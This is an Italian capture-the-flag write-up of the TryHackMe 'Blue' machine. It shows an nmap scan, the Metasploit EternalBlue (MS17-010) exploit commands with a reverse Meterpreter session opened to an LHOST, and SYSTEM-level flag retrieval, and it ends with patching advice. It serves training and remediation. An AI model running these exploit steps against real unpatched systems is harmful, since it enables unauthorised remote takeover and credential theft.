# Blue — TryHackMe

**Data:** 25/08/2026  
**Autore:** Daniel Marceddu  
**Difficoltà:** Facile  
**Piattaforma:** TryHackMe  
**IP Target:** 10.112.168.136

---

## Executive Summary

Blue è una macchina Windows vulnerabile a **MS17-010 (EternalBlue)**, una delle vulnerabilità SMB più note della storia recente, sfruttata dal ransomware WannaCry nel 2017. L'exploit permette l'esecuzione remota di codice con privilegi di sistema senza autenticazione.

---

## 1. Reconnaissance

### Port Scan
```bash
nmap -sC -sV -Pn -oN nmap/initial.txt 10.112.168.136
Porte aperte:
135/tcp — Microsoft Windows RPC
139/tcp — netbios-ssn
445/tcp — microsoft-ds (SMB)
3389/tcp — RDP
5985/tcp — WinRM
49152-49155/tcp — RPC dinamici
OS rilevato: Windows Server 2012 R2 Datacenter 9600 x64
SMB signing: disabled (dangerous, but default)
2. Exploitation
Vulnerability: MS17-010 EternalBlue
Il target è vulnerabile a CVE-2017-0144 — buffer overflow nel driver SMBv1 di Windows che permette l'esecuzione remota di codice in kernel mode.
Metasploit
bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.112.168.136
set LHOST 192.168.159.52
exploit
Risultato: Meterpreter session aperta direttamente come NT AUTHORITY\SYSTEM.
bash
meterpreter > sysinfo
Computer        : WIN-JO6REVNMMMP
OS              : Windows Server 2012 R2 (6.3 Build 9600)
Architecture    : x64
Domain          : WORKGROUP
Meterpreter     : x64/windows

meterpreter > getsystem
[-] Already running as SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
3. Post-Exploitation — Flag Recovery
bash
meterpreter > search -f *flag*.txt
Found 3 results...
c:\flag1.txt
c:\Windows\System32\config\flag2.txt
c:\Users\Jon\Documents\flag3.txt
Fogli di calcolo
Flag	Location	Contenuto
Flag 1	c:\flag1.txt	flag{access_the_machine}
Flag 2	c:\Windows\System32\config\flag2.txt	flag{sam_database_elevated_access}
Flag 3	c:\Users\Jon\Documents\flag3.txt	flag{admin_documents_can_be_valuable}
4. Remediation
Fogli di calcolo
Vulnerabilità	Fix
MS17-010 EternalBlue	Installare KB4013389 (patch Microsoft) o disabilitare SMBv1
SMB signing disabled	Abilitare RequireSecuritySignature via Group Policy
Windows Server 2012 R2 EOL	Aggiornare a Windows Server 2019/2022 o applicare ESU
5. Tool Utilizzati
Nmap
Metasploit Framework (exploit/windows/smb/ms17_010_eternalblue)
Meterpreter (sysinfo, getsystem, search, cat)
6. Conclusion
EternalBlue dimostra perché le patch di sicurezza non sono opzionali. Una vulnerabilità del 2017, su un sistema non aggiornato, permette ancora oggi la compromissione totale in pochi secondi. La presenza della flag nel database SAM (flag2.txt) evidenzia il rischio concreto: accesso alle credenziali hash di tutti gli utenti del dominio.
